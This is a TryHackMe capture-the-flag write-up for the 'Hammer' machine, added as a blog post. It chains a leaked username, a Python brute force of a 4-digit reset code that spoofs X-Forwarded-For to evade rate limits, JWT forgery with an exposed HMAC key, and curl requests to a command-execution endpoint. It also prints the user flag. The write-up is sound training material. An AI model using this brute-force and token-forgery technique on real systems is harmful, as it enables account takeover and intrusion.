@@ -1,0 +1,288 @@
+---
+slug: "thm-hammer"
+title: "Hammer — TryHackMe Writeup"
+date: "2026-07-20"
+platform: "TryHackMe"
+type: "Machine"
+os: "Linux"
+difficulty: "Medium"
+tags:
+  - "Web"
+  - "JWT"
+  - "OTP-Bypass"
+  - "RCE"
+excerpt: "Chaining a leaked email in an open log, a 4-digit recovery-code brute force, and an HS256 JWT forgery to reach command execution on a custom port-1337 web app."
+readTime: "12 min"
+rating: 3.5
+url: "https://asbawy.github.io/writeups/thm-hammer"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag, SkillMatrix } from "@/components/cyber/WriteupComponents";
+
+<KillChain steps={[
+  { phase: "Reconnaissance", title: "Scanning & Fuzzing", desc: "Nmap exposes SSH and a custom web app on port 1337. Fuzzing with the hmr_ prefix leaks an open log that dumps a valid username.", tools: ["Nmap", "ffuf"] },
+  { phase: "Foothold", title: "OTP Brute Force & Account Takeover", desc: "Bypassed the password reset rate-limit with X-Forwarded-For spoofing, brute-forced the 4-digit recovery code, and reset the password to grab the user flag.", technique: "OTP Brute Force", tools: ["Python", "Caido"] },
+  { phase: "PrivEsc", title: "JWT Forgery to RCE", desc: "Forged an admin HS256 token using an exposed key, then abused execute_command.php for command execution to retrieve the root flag.", technique: "JWT Forgery", tools: ["Caido", "curl"] }
+]} />
+
+### Skill Matrix
+
+<SkillMatrix skills={[
+  { name: "Web Fuzzing", level: 7 },
+  { name: "Authentication Bypass", level: 8 },
+  { name: "JWT Attacks", level: 9 },
+  { name: "OS Command Injection", level: 6 }
+]} />
+
+---
+
+## Introduction
+
+*Hammer* is a medium-rated Linux machine that front-ends a small custom PHP web app on a non-standard HTTP port (**1337**). The application features a login portal with a "forgot password" flow. Our objective is to capture two flags:
+
+1. A **user flag** located behind the authenticated dashboard.
+2. A **root flag** readable only after escalating to an admin role and triggering remote command execution.
+
+The entire attack chain is web-based—no SSH credentials are required for the intended path.
+
+---
+
+## Reconnaissance
+
+### Nmap Scan
+
+A full TCP port scan reveals two listening services:
+
+```bash
+nmap -sC -sV -p- 10.113.158.252 -oN nmap_full.txt
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 0c:27:1c:24:83:8c:fe:e9:81:73:b2:8b:78:0a:0d:63 (RSA)
+|   256 12:a8:26:0d:7b:d4:6a:89:e0:3c:1f:99:bd:27:71:f7 (ECDSA)
+|_  256 03:5b:2c:9e:9e:49:e5:c9:0f:c8:51:78:23:a2:4c:4e (ED25519)
+1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+<Callout type="info">
+Only two ports are open: SSH and a custom Apache web application on port 1337. The `PHPSESSID` cookie lacks the `HttpOnly` flag.
+</Callout>
+
+Browsing to `http://10.113.158.252:1337/` returns a login page. An HTML comment found in the page source provides a small but crucial hint:
+
+```html
+<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
+```
+
+This `hmr_` prefix serves as an excellent anchor for directory fuzzing.
+
+### Web Enumeration
+
+Using the `hmr_` convention, we can fuzz for hidden directories:
+
+```bash
+ffuf -u http://10.113.158.252:1337/hmr_FUZZ \
+     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+     -mc 200,204,301,302,403,405 -t 50
+```
+
+This reveals several directories: `hmr_css`, `hmr_js`, `hmr_images`, and most importantly, **`hmr_logs`**.
+
+### The Leak: `hmr_logs/error.logs`
+
+The `hmr_logs/` directory has auto-indexing enabled, and the `error.logs` file is world-readable. Digging through the Apache error lines uncovers a critical piece of information:
+
+```text
+[authz_core:error] ... user tester@hammer.thm: authentication failure for "/restricted-area"
+```
+
+![Error logs leaking the username](https://i.imgur.com/drUZC32.png)
+
+We now have a **valid username**: `tester@hammer.thm`. The next step is to abuse the password reset functionality.
+
+---
+
+## Initial Foothold
+
+### Understanding the Reset Flow
+
+Accessing `reset_password.php` with the leaked email returns a secondary form asking for a **4-digit recovery code**, alongside a hidden `s` field acting as a client-side countdown timer. Two protections stand out:
+
+1. **Per-session rate limit** — visible in the `Rate-Limit-Pending` response header.
+2. **Client-side timer** — the `s` value is merely a number that the browser counts down; the server trusts whatever value we send.
+
+![Password reset flow countdown](https://i.imgur.com/hKTTP3u.png)
+
+### Bypassing Rate Limiting and Timers
+
+<Callout type="info">
+**Two Bugs, One Exploit:** Spoofing the `X-Forwarded-For` header with a random IP defeats the IP-based rate limiter, and submitting a massive `s` value (e.g., `999999999`) neutralizes the client-side countdown. Rotating the PHP session cookie every few attempts prevents the per-session counter from blocking our requests.
+</Callout>
+
+A short Python script can quickly iterate through the 0000–9999 space to brute-force the recovery code:
+
+```python
+import requests
+import random
+
+BASE = "http://10.113.158.252:1337"
+EMAIL = "tester@hammer.thm"
+
+def xff():
+    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+
+s = requests.Session()
+for code in range(10000):
+    if code % 5 == 0:  # Rotate session to dodge the counter
+        s.cookies.clear()
+        s.post(f"{BASE}/reset_password.php", data={"email": EMAIL}, headers={"X-Forwarded-For": xff()})
+    
+    r = s.post(f"{BASE}/reset_password.php",
+               data={"recovery_code": f"{code:04d}", "s": "999999999"},
+               headers={"X-Forwarded-For": xff()})
+               
+    if "Invalid or expired recovery code" not in r.text:
+        print(f"[+] Recovery code = {code:04d}")
+        break
+```
+
+The script successfully stops at **`1034`**. With the correct code accepted, we are redirected to the *Set New Password* form.
+
+![Set New Password form](https://i.imgur.com/mihHwlf.png)
+
+### Login & User Flag
+
+Logging in with our newly set credentials assigns us a `token` cookie (which is a JWT) and redirects us to the dashboard:
+
+```bash
+curl -s -i -d "email=tester@hammer.thm" -d "password=H@mmerPwn3d!" \
+     http://10.113.158.252:1337/
+```
+
+The dashboard greets us with **`Welcome, Thor!`** and presents the user flag:
+
+![Dashboard showing the user flag](https://i.imgur.com/JuR3aPL.png)
+
+<SpoilerFlag label="User Flag" flag="THM{AuthBypass3D}" />
+
+---
+
+## Privilege Escalation
+
+### Anatomy of the Issued Token
+
+Decoding the `token` cookie from the dashboard reveals the following structure:
+
+![Decoded JWT in caido](https://i.imgur.com/EPJXftU.png)
+
+**Header:**
+```json
+{
+  "typ": "JWT",
+  "alg": "HS256",
+  "kid": "/var/www/mykey.key"
+}
+```
+
+**Payload:**
+```json
+{
+  "iss": "http://hammer.thm",
+  "aud": "http://hammer.thm",
+  "data": { 
+    "user_id": 1, 
+    "email": "tester@hammer.thm", 
+    "role": "user" 
+  }
+}
+```
+
+Two key observations:
+1. The algorithm is symmetric (**HS256**), meaning the same secret is used to both sign and verify the token.
+2. Our current role is `user`. We need to elevate this to `admin` to interact with the command execution endpoint.
+
+### Analyzing the Dashboard
+
+The dashboard provides a command execution interface. Attempting to run standard commands like `pwd` results in a "Command not allowed" error.
+
+![Command not allowed error](https://i.imgur.com/CVDPlA7.png)
+
+However, testing other basic commands reveals that `ls` executes successfully:
+
+![ls command output](https://i.imgur.com/Zj0JJAj.png)
+
+```json
+{
+    "output": "188ade1.key\ncomposer.json\nconfig.php\ndashboard.php\nexecute_command.php\nhmr_css\nhmr_images\nhmr_js\nhmr_logs\nindex.php\nlogout.php\nreset_password.php\nvendor\n"
+}
+```
+
+Most of these files are standard or expected, but `188ade1.key` stands out.
+
+### Recovering the Signing Secret
+
+Since `188ade1.key` is located in the web root, we can fetch it directly:
+
+```bash
+curl -s http://10.113.158.252:1337/188ade1.key
+# Output: 56058354efb3daa97ebab00fabd7a7d7
+```
+
+This 32-character string is the HMAC secret used to sign the JWTs.
+
+### Forging the Admin Token
+
+With the secret in hand, we can forge a new token. We will update the payload to set the `role` to `admin`, keep the `kid` pointing to the absolute path `/var/www/html/188ade1.key`, and sign it using the recovered secret string.
+
+You can use a proxy like Caido or Burp Suite, online tools like [jwt.io](https://jwt.io/), or a custom Python script to generate the forged JWT.
+
+![Forging the JWT with the admin role](https://i.imgur.com/Ag4f5Qo.png)
+
+### Triggering RCE via `execute_command.php`
+
+The dashboard sends POST requests to `execute_command.php`, which validates whether the `role` is `admin`. We can replay this request using our newly forged bearer token:
+
+```bash
+curl -s 'http://10.113.158.252:1337/execute_command.php' \
+  -H "Authorization: Bearer <ADMIN_JWT>" \
+  -H "Content-Type: application/json" \
+  -d '{"command":"id"}'
+```
+
+Because the application is vulnerable to OS command injection via this endpoint, any command we send will be executed by the web service account. To read the root flag:
+
+```bash
+curl -s 'http://10.113.158.252:1337/execute_command.php' \
+  -H "Authorization: Bearer <ADMIN_JWT>" \
+  -H "Content-Type: application/json" \
+  -d '{"command":"cat /home/ubuntu/flag.txt"}'
+```
+
+<Callout type="info">
+**Manual Execution:** You can easily send the forged `Authorization: Bearer <ADMIN_JWT>` request to `execute_command.php` using a tool like Caido or Burp Suite Repeater. Include the JSON body `{"command":"cat /home/ubuntu/flag.txt"}` to retrieve the flag.
+</Callout>
+
+![Executing the command in Caido](https://i.imgur.com/ssEEGG7.png)
+
+**Root Flag:**
+
+<SpoilerFlag label="Root Flag" flag="THM{<root-flag-captured-manually-via-RCE>}" />
+
+---
+
+## Summary
+
+Hammer is an excellent demonstration of **chaining small web vulnerabilities** to achieve complete system compromise:
+
+1. An **open log directory** (`hmr_logs/error.logs`) leaked a valid username.
+2. A **recovery-code reset** with a small 4-digit keyspace and easily bypassable rate-limiting allowed for account takeover.
+3. A **symmetrically-signed JWT** paired with an **exposed HMAC secret** enabled us to forge an admin token, ultimately leading to **OS command execution**.
